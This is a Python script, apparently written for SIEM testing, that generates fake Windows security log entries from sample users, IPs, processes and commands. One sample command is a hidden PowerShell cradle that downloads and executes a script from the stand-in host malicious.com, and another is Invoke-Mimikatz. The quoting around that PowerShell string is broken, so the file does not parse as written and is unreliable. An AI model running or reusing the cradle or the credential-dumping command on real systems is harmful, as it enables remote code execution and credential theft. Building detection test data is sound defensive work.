"""
SIEM Log Simulator
Author: Charles G. | Auroch Security
Purpose: Generate synthetic Windows-style security events for SIEM testing
"""

import random
import time
from datetime import datetime
import argparse

# Sample log types
log_templates = [
    "[{timestamp}] SECURITY - Failed login attempt for user '{user}' from IP {ip}",
    "[{timestamp}] ALERT - Suspicious PowerShell command execution: '{command}'",
    "[{timestamp}] INFO - New process started: '{process}' by user '{user}'",
    "[{timestamp}] WARNING - Excessive failed logins from IP {ip}",
    "[{timestamp}] MALWARE - Detected malware hash match on file '{filename}'"
]

# Sample values
users = ['jsmith', 'admin', 'bjones', 'dpatel', 'unknown']
ips = ['192.168.1.12', '10.0.0.55', '172.16.0.101', '203.0.113.14', '185.62.188.88']
commands = ['powershell.exe -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://malicious.com/ps.ps1')"',
            'Invoke-Mimikatz', 'whoami', 'Get-LocalGroupMember Administrators']
processes = ['notepad.exe', 'cmd.exe', 'explorer.exe', 'ransom_sim.exe']
filenames = ['invoice.docx.exe', 'important-update.bat', 'credentials.txt', 'backdoor.vbs']

# Argument parser
parser = argparse.ArgumentParser(description="SIEM Log Simulator")
parser.add_argument("-n", "--num", type=int, default=50, help="Number of logs to generate")
parser.add_argument("-o", "--output", type=str, default="simulated_logs.txt", help="Output file")
args = parser.parse_args()

# Write simulated logs
with open(args.output, "w") as logfile:
    for _ in range(args.num):
        template = random.choice(log_templates)
        log_entry = template.format(
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            user=random.choice(users),
            ip=random.choice(ips),
            command=random.choice(commands),
            process=random.choice(processes),
            filename=random.choice(filenames)
        )
        logfile.write(log_entry + "\n")
        print(log_entry)
        time.sleep(0.1)  # simulate log timing
